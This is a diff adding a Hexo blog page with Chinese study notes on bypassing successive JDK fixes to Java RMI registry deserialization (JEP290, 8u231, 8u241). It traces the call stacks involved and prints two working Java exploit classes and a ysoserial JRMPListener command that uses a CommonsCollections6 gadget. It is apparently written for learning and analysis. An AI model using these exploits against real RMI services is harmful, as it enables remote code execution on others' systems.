@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DT27XM4C8J"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-DT27XM4C8J');
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+    <div class="hd logodiv" style="margin-top: 3%;">
+    <!-- <img src="/img/logo.png" class="logopng"> -->
+    <p class="logot">
+        <a href="/" style="color: #4f4646;text-decoration: none;">
+            unknown&#39;s blog 
+        </a>
+    </p>
+</div>
+<div class="hd">
+    <ol class="breadcrumb">
+        
+            <li><a class="ba" href="/tech">Tech</a></li>
+        
+            <li><a class="ba" href="/life">Life</a></li>
+        
+            <li><a class="ba" href="/essay">Essay</a></li>
+        
+            <li><a class="ba" href="/links">Friends</a></li>
+        
+            <li><a class="ba" target="_blank" rel="noopener" href="https://running.unk.org.cn/">Running</a></li>
+        
+            <li><a class="ba" href="/about">About</a></li>
+        
+            <li><a class="ba" href="/subscribe">Subscribe</a></li>
+        
+    </ol>
+    <hr class="breadcrumbhr">
+</div>
+
+    
+<div class="hd posts">
+
+    <!-- <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a> -->
+    <div class="post-title">
+        <p>
+            RMI反序列化学习笔记(3): 绕过手法
+        </p>
+        <!-- <hr> -->
+    </div>
+    <div class="post-content">
+        <p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://halfblue.github.io/2021/11/03/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%B8%89%E9%A1%BE%E8%8C%85%E5%BA%90-JEP290%E7%BB%95%E8%BF%87/">https://halfblue.github.io/2021/11/03/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%B8%89%E9%A1%BE%E8%8C%85%E5%BA%90-JEP290%E7%BB%95%E8%BF%87/</a></p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以下的修复全部都是针对前述攻击手法中的<code>lookup bind 攻击注册中心</code>，因为这个相比于其他更容易利用：只要开放了服务即可被利用。method hash那个利用条件是知道远程接口的参数类型且类型不为基础类型；服务端攻击客户端场景不常见。</p>
+<h1 id="第一次修复-JEP290-与绕过"><a href="#第一次修复-JEP290-与绕过" class="headerlink" title="第一次修复(JEP290)与绕过"></a>第一次修复(JEP290)与绕过</h1><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>JDK8u121</p>
+<p>1、checkAccess，要求注册中心和服务端都在一台机上。</p>
+<p>2、在<code>RegistryImpl_Skel</code>中配置了白名单，也就是说lookup和bind传过去的对象只能是白名单里的。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handleMessages</span><br><span class="line">    serviceCall</span><br><span class="line">		UnicastServerRef#dispatch</span><br><span class="line">			oldDispatch</span><br><span class="line">				RegistryImpl_Skel#dispatch //客户端/服务端攻击注册中心</span><br><span class="line">					case 0: // bind(String, Remote)</span><br><span class="line">					case 1: // list()</span><br><span class="line">					case 2: // lookup(String)</span><br><span class="line">						//白名单添加在这里</span><br><span class="line">						in.readObject(); // 对lookup的参数进行反序列化。客户端攻击服务端</span><br><span class="line">					case 3: // rebind(String, Remote)</span><br><span class="line">					case 4: // unbind(String)</span><br></pre></td></tr></table></figure>
+
+<p>3、DGCImpl_Skel和DGCImpl_Stub里面的对象反序列化时会进行白名单校验，内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return (clazz == ObjID.class ||</span><br><span class="line">                 clazz == UID.class ||</span><br><span class="line">                 clazz == VMID.class ||</span><br><span class="line">                 clazz == Lease.class)</span><br><span class="line">                 ? ObjectInputFilter.Status.ALLOWED</span><br><span class="line">                 : ObjectInputFilter.Status.REJECTED;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>绕过的调用栈</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Reigstry_Skel#dispatch</span><br><span class="line">	// 1. readObject </span><br><span class="line">        UnicastRef#readExternal</span><br><span class="line">            LiveRef#read</span><br><span class="line">                ConnectionInputStream#saveRef</span><br><span class="line">                    //修改incomingRefTable，使之不为空</span><br><span class="line">	// 2.releaseInputStream</span><br><span class="line">    StreamRemoteCall#releaseInputStream //有个if，需要incomingRefTable不为空才能进入</span><br><span class="line">        ConnectionInputStream#registerRefs</span><br><span class="line">            DGCClient#registerRefs</span><br><span class="line">            	DGCClient$EndPointEntry#lookup</span><br><span class="line">            		DGCClient$EndPointEntry 构造函数</span><br><span class="line">            			RenewCleanThread#run</span><br><span class="line">                            makeDirtyCall</span><br><span class="line">                                DGCImpl_Stub#dirty</span><br><span class="line">                                    readObject</span><br></pre></td></tr></table></figure>
+
+<p>监听</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections6 calc</span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class JRMPRegistryExploit &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        RegistryImpl_Stub registry = (RegistryImpl_Stub) LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);</span><br><span class="line">        lookup(registry);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void lookup(RegistryImpl_Stub registry) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        Class RemoteObjectClass = registry.getClass().getSuperclass().getSuperclass();</span><br><span class="line">        Field refField = RemoteObjectClass.getDeclaredField(&quot;ref&quot;);</span><br><span class="line">        refField.setAccessible(true);</span><br><span class="line">        UnicastRef ref = (UnicastRef) refField.get(registry);</span><br><span class="line"></span><br><span class="line">        Operation[] operations = new Operation[]&#123;new Operation(&quot;void bind(java.lang.String, java.rmi.Remote)&quot;), new Operation(&quot;java.lang.String list()[]&quot;), new Operation(&quot;java.rmi.Remote lookup(java.lang.String)&quot;), new Operation(&quot;void rebind(java.lang.String, java.rmi.Remote)&quot;), new Operation(&quot;void unbind(java.lang.String)&quot;)&#125;;</span><br><span class="line"></span><br><span class="line">        RemoteCall var2 = ref.newCall(registry, operations, 2, 4905912898345647071L);</span><br><span class="line"></span><br><span class="line">        ObjectOutput var3 = var2.getOutputStream();</span><br><span class="line"></span><br><span class="line">        var3.writeObject(genEvilJRMPObj());</span><br><span class="line">        ref.invoke(var2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    private static Object genEvilJRMPObj() &#123;</span><br><span class="line">        LiveRef liveRef = new LiveRef(new ObjID(), new TCPEndpoint(&quot;127.0.0.1&quot;, 7777), false);</span><br><span class="line">        UnicastRef unicastRef = new UnicastRef(liveRef);</span><br><span class="line">        return unicastRef;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="第二次修复与绕过"><a href="#第二次修复与绕过" class="headerlink" title="第二次修复与绕过"></a>第二次修复与绕过</h1><p>JDK8u231</p>
+<h2 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Reigstry_Skel#dispatch</span><br><span class="line">	// 第一处修复</span><br><span class="line">	// 由于readObject一定会触发异常，所以在catch处清空incomingRefTable，使之为空。</span><br><span class="line">	// 1. readObject </span><br><span class="line">        UnicastRef#readExternal</span><br><span class="line">            LiveRef#read</span><br><span class="line">                ConnectionInputStream#saveRef</span><br><span class="line">                    //修改incomingRefTable，使之不为空</span><br><span class="line">	// 2.releaseInputStream</span><br><span class="line">    StreamRemoteCall#releaseInputStream //有个if，需要incomingRefTable不为空才能进入</span><br><span class="line">        ConnectionInputStream#registerRefs</span><br><span class="line">            DGCClient#registerRefs</span><br><span class="line">            	DGCClient$EndPointEntry#lookup</span><br><span class="line">            		DGCClient$EndPointEntry 构造函数</span><br><span class="line">            			RenewCleanThread#run</span><br><span class="line">                            makeDirtyCall</span><br><span class="line">                                DGCImpl_Stub#dirty</span><br><span class="line">                                	//第二处修复</span><br><span class="line">                            		//在这里添加了过滤，多了一个setObjectInputFilter，使得readObject受限</span><br><span class="line">                                    readObject</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h2><blockquote>
+<p>而如果想实现攻击，要满足几个条件：<br>1、找到一处不受限制的反序列化<br>2、白名单类可以通过反序列化触发上述不受限的反序列化<br>3、触发点就在readObject中</p>
+</blockquote>
+<p>调用栈</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Reigstry_Skel#dispatch</span><br><span class="line">    UnicastRemoteObject#readObject</span><br><span class="line">        reexport</span><br><span class="line">            ...</span><br><span class="line">                TCPTransport#listen</span><br><span class="line">                    TCPEndPoint#newServerSocket</span><br><span class="line">                        RemoteObjectInvocationHandler#invoke</span><br><span class="line">                        	RemoteObjectInvocationHandler#invokeRemoteMethod</span><br><span class="line">                                UnicastRef#invoke</span><br><span class="line">                                    executeCall</span><br><span class="line">                                        //发送JRMP请求，然后对返回结果readObject</span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class UnicastRemoteObjectExploit &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        RegistryImpl_Stub registry = (RegistryImpl_Stub) LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);</span><br><span class="line">        exploit(registry,&quot;127.0.0.1&quot;,7777);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static void exploit(RegistryImpl_Stub registry,String host,int port) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        UnicastRemoteObject unicastRemoteObject = getObj(host,port);</span><br><span class="line">        Class RemoteObjectClass = registry.getClass().getSuperclass().getSuperclass();</span><br><span class="line">        Field refField = RemoteObjectClass.getDeclaredField(&quot;ref&quot;);</span><br><span class="line">        refField.setAccessible(true);</span><br><span class="line">        UnicastRef ref = (UnicastRef) refField.get(registry);</span><br><span class="line"></span><br><span class="line">        Operation[] operations = new Operation[]&#123;new Operation(&quot;void bind(java.lang.String, java.rmi.Remote)&quot;), new Operation(&quot;java.lang.String list()[]&quot;), new Operation(&quot;java.rmi.Remote lookup(java.lang.String)&quot;), new Operation(&quot;void rebind(java.lang.String, java.rmi.Remote)&quot;), new Operation(&quot;void unbind(java.lang.String)&quot;)&#125;;</span><br><span class="line"></span><br><span class="line">        RemoteCall var2 = ref.newCall(registry, operations, 2, 4905912898345647071L);</span><br><span class="line"></span><br><span class="line">        ObjectOutput var3 = var2.getOutputStream();</span><br><span class="line"></span><br><span class="line">        Field f = ObjectOutputStream.class.getDeclaredField( &quot;enableReplace&quot; );</span><br><span class="line">        f.setAccessible( true );</span><br><span class="line">        f.set( var3, false );</span><br><span class="line"></span><br><span class="line">        var3.writeObject(unicastRemoteObject);</span><br><span class="line">        ref.invoke(var2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static UnicastRemoteObject getObj(String host,int port) throws  Exception&#123;</span><br><span class="line">        LiveRef liveRef = new LiveRef(new ObjID(7777), new TCPEndpoint(host,port), false);</span><br><span class="line">        UnicastRef ref = new UnicastRef(liveRef);</span><br><span class="line">        RemoteObjectInvocationHandler remoteObjectInvocationHandler = new RemoteObjectInvocationHandler(ref);</span><br><span class="line">        RMIServerSocketFactory rmiServerSocketFactory = (RMIServerSocketFactory) Proxy.newProxyInstance(RMIServerSocketFactory.class.getClassLoader(),</span><br><span class="line">                new Class[]&#123;RMIServerSocketFactory.class, Remote.class&#125;,remoteObjectInvocationHandler</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        Constructor RemoteObjectConstructor = RemoteObject.class.getDeclaredConstructor(RemoteRef.class);</span><br><span class="line">        RemoteObjectConstructor.setAccessible(true);</span><br><span class="line">        Constructor&lt;?&gt; unicastRemoteObjectConstructor = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(UnicastRemoteObject.class, RemoteObjectConstructor);</span><br><span class="line">        UnicastRemoteObject unicastRemoteObject = (UnicastRemoteObject) unicastRemoteObjectConstructor.newInstance(new UnicastRef(liveRef));</span><br><span class="line"></span><br><span class="line">        Field ssfField = unicastRemoteObject.getClass().getDeclaredField(&quot;ssf&quot;);</span><br><span class="line">        ssfField.setAccessible(true);</span><br><span class="line">        ssfField.set(unicastRemoteObject,rmiServerSocketFactory);</span><br><span class="line">        return unicastRemoteObject;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>监听</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections6 calc</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="最后修复"><a href="#最后修复" class="headerlink" title="最后修复"></a>最后修复</h1><p>JDK8u241</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Reigstry_Skel#dispatch</span><br><span class="line">	// 第一处，这个位置的readObject变成readString</span><br><span class="line">    UnicastRemoteObject#readObject</span><br><span class="line">        reexport</span><br><span class="line">            ...</span><br><span class="line">                TCPTransport#listen</span><br><span class="line">                    TCPEndPoint#newServerSocket</span><br><span class="line">                        RemoteObjectInvocationHandler#invoke</span><br><span class="line">                        	RemoteObjectInvocationHandler#invokeRemoteMethod</span><br><span class="line">                        		// 第二处</span><br><span class="line">                                UnicastRef#invoke</span><br><span class="line">                                    executeCall</span><br><span class="line">                                        //发送JRMP请求，然后对返回结果readObject</span><br><span class="line">                                    unmarshalValue</span><br><span class="line">                                    	//第三处，当调用方法参数类型为String时，由原本的readObject变为readString</span><br><span class="line">                                    	readObject</span><br></pre></td></tr></table></figure>
+
+<p>第二处修复在<code>RemoteObjectInvocationHandler#invokeRemoteMethod</code>中多加了一个if。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/RMI(3)/image-20240225202011466.png" alt="image-20240225202011466.png"></p>
+<p>此时攻击服务端的唯一手段就是知道远程接口的参数类型，且类型不为基础类型和String。</p>
+
+    </div>
+    
+    <div class="toc-container">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%BF%AE%E5%A4%8D-JEP290-%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="toc-text">第一次修复(JEP290)与绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-text">修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-text">绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BF%AE%E5%A4%8D%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="toc-text">第二次修复与绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D-1"><span class="toc-text">修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-1"><span class="toc-text">绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E4%BF%AE%E5%A4%8D"><span class="toc-text">最后修复</span></a></li></ol>
+    </div>
+
+    
+        <div id="custom-comments" class="custom-comments">
+    <h3>Comments</h3>
+    <form id="comment-form" class="comment-form">
+        <div class="form-row">
+            <input type="text" id="c-nickname" placeholder="Nickname *" required>
+            <input type="email" id="c-email" placeholder="Email">
+            <input type="url" id="c-website" placeholder="Website">
+        </div>
+        <textarea id="c-content" placeholder="Leave a comment..." required></textarea>
+        <button type="submit" id="c-submit">Submit</button>
+    </form>
+    <div id="comment-list" class="comment-list">
+        <!-- Comments will be loaded here -->
+        <p class="loading">Loading comments...</p>
+    </div>
+</div>
+
+<style>
+    .custom-comments {
+        margin-top: 40px;
+        border-top: 1px solid #eee;
+        padding-top: 20px;
+    }
+    .comment-form {
+        margin-bottom: 30px;
+    }
+    .comment-form .form-row {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 10px;
+    }
+    .comment-form input, .comment-form textarea {
+        width: 100%;
+        padding: 8px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        background: #f9f9f9;
+    }
+    .comment-form textarea {
+        height: 100px;
+        resize: vertical;
+        margin-bottom: 10px;
+    }
+    .comment-form button {
+        padding: 8px 20px;
+        background: #333;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+    }
+    .comment-form button:hover {
+        background: #555;
+    }
+    .comment-item {
+        margin-bottom: 20px;
+        border-bottom: 1px solid #f0f0f0;
+        padding-bottom: 15px;
+    }
+    .comment-header {
+        margin-bottom: 5px;
+        font-size: 0.9em;
+        color: #666;
+    }
+    .comment-author {
+        font-weight: bold;
+        color: #333;
+        margin-right: 10px;
+    }
+    .comment-date {
+        font-size: 0.8em;
+        color: #999;
+    }
+    .comment-content {
+        line-height: 1.6;
+        color: #333;
+    }
+</style>
+
+<script>
+(function() {
+    const apiUrl = 'https://unk-blo-backend-rduuehbram.cn-shenzhen.fcapp.run';
+    const postUrl = window.location.pathname;
+    const commentList = document.getElementById('comment-list');
+    const commentForm = document.getElementById('comment-form');
+    const submitBtn = document.getElementById('c-submit');
+
+    function formatDate(timestamp) {
+        return new Date(timestamp).toLocaleString();
+    }
+
+    function escapeHtml(text) {
+        if (!text) return '';
+        return text
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;");
+    }
+
+    // Load comments
+    fetch(`${apiUrl}/api/comments?url=${encodeURIComponent(postUrl)}`)
+        .then(response => response.json())
+        .then(data => {
+            commentList.innerHTML = '';
+            if (data.comments && data.comments.length > 0) {
+                data.comments.forEach(comment => {
+                    const div = document.createElement('div');
+                    div.className = 'comment-item';
+                    
+                    let authorHtml = `<span class="comment-author">${escapeHtml(comment.nickname)}</span>`;
+                    if (comment.website) {
+                        authorHtml = `<a href="${escapeHtml(comment.website)}" target="_blank" class="comment-author">${escapeHtml(comment.nickname)}</a>`;
+                    }
+
+                    div.innerHTML = `
+                        <div class="comment-header">
+                            ${authorHtml}
+                            <span class="comment-date">${formatDate(comment.timestamp)}</span>
+                        </div>
+                        <div class="comment-content">${escapeHtml(comment.content)}</div>
+                    `;
+                    commentList.appendChild(div);
+                });
+            } else {
+                commentList.innerHTML = '<p>No comments yet. Be the first!</p>';
+            }
+        })
+        .catch(err => {
+            console.error('Error loading comments:', err);
+            commentList.innerHTML = '<p>Error loading comments.</p>';
+        });
+
+    // Submit comment
+    commentForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const nickname = document.getElementById('c-nickname').value;
+        const email = document.getElementById('c-email').value;
+        const website = document.getElementById('c-website').value;
+        const content = document.getElementById('c-content').value;
+
+        submitBtn.disabled = true;
+        submitBtn.innerText = 'Submitting...';
+
+        fetch(`${apiUrl}/api/comment`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                post_url: postUrl,
+                nickname: nickname,
+                email: email,
+                website: website,
+                content: content
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.message) {
+                // Add new comment to list immediately
+                const div = document.createElement('div');
+                div.className = 'comment-item';
+                div.innerHTML = `
+                    <div class="comment-header">
+                        <span class="comment-author">${escapeHtml(nickname)}</span>
+                        <span class="comment-date">Just now</span>
+                    </div>
+                    <div class="comment-content">${escapeHtml(content)}</div>
+                `;
+                
+                // Insert at the beginning or append if empty
+                if (commentList.querySelector('.comment-item')) {
+                    commentList.insertBefore(div, commentList.firstChild);
+                } else {
+                    commentList.innerHTML = '';
+                    commentList.appendChild(div);
+                }
+                
+                commentForm.reset();
+            } else {
+                alert('Error: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(err => {
+            console.error('Error submitting comment:', err);
+            alert('Error submitting comment');
+        })
+        .finally(() => {
+            submitBtn.disabled = false;
+            submitBtn.innerText = 'Submit';
+        });
+    });
+})();
+</script>
+
+    
+
+
+</div>
+<script>
+    window.onload = ()=>{
+
+        document.title = document.querySelector('.post-title p').innerText;
+
+        var zoomImgs = function() {
+            const images = document.querySelectorAll('.post-content img'); // Only select images in post content
+            images.forEach(img => {
+                img.style.width = '70%'
+                img.style.height = 'auto'
+            });
+        }
+
+        zoomImgs()
+    }
+    
+</script>
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<input type="hidden" id="valine_appid" value="diYBpeShV6s47KsfNez5JmBU-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="u3BEDbLDNridDApcAzJBWc9N">
+<input type="hidden" id="valine_enable" value="false">
+<input type="hidden" id="valine_placeholder" value="留下你的评论吧...">
+<input type="hidden" id="valine_avatar" value="hide">
+
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/js/lightbox.js"></script>
+
+
+
+<script>
+
+    var valine_appid = $("#valine_appid").val();
+    var valine_appKey = $("#valine_appKey").val();
+    var valine_enable = $("#valine_enable").val();
+    var valine_placeholder = $("#valine_placeholder").val();
+    var valine_avatar = $("#valine_avatar").val();
+
+    if(valine_enable == 'true'){
+        // Valine initialization code only if enabled
+        if (typeof Valine !== 'undefined') {
+            new Valine({
+                el: '#vcomments',
+                appId: valine_appid,
+                appKey: valine_appKey,
+                placeholder: valine_placeholder,
+                avatar: valine_avatar,
+            })
+        }
+    }
+
+</script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
